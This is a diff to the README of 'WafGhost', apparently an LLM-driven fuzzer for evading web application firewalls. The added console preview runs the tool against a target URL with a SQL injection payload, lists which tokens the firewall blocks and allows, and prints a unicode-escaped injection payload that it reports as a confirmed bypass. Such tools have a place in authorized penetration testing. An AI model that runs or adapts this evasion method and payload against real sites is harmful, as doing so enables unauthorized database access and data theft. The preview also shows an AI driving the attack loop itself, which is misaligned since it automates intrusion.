@@ -17,6 +17,35 @@ It maps target firewall filters to identify blocked vs allowed symbols and keywo
 
 ---
 
+### Console Preview
+
+```text
+$ wafghost --url "http://target.com/search?q=" --payload "1' UNION SELECT 1,2,3--" --use-llm
+
+ WafGhost: LLM-Driven Evasion Fuzzer v0.1.0
+ ==============================================================
+ Target URL:   http://target.com/search?q=
+ Base Payload: "1' UNION SELECT 1,2,3--"
+ Mode:         Stateful AI Reasoning Loop (Active)
+ ==============================================================
+
+ [*] Running differential token probing...
+     [+] Blocked:  ['\'', 'UNION', 'SELECT', '--', '/*']
+     [+] Allowed:  ['\U0027', '\U0020', ',', 'CONCAT']
+
+ [*] Starting stateful chat loop...
+
+   [Attempt 1] 
+   Strategy: Testing uppercase unicode escape to crash normalizer
+   Payload:  1\U0027\U0020unIOn\u0020selEct\u00201\u002c2\u002C3\u002d\u002D
+   Response: HTTP 200 OK (542 bytes)
+
+ >>> SUCCESS: Bypass payload confirmed after 1 attempt!
+ >>> Winning Payload: 1\U0027\U0020unIOn\u0020selEct\u00201\u002c2\u002C3\u002d\u002D
+```
+
+---
+
 ### Key Capabilities
 
 | Feature | Description |
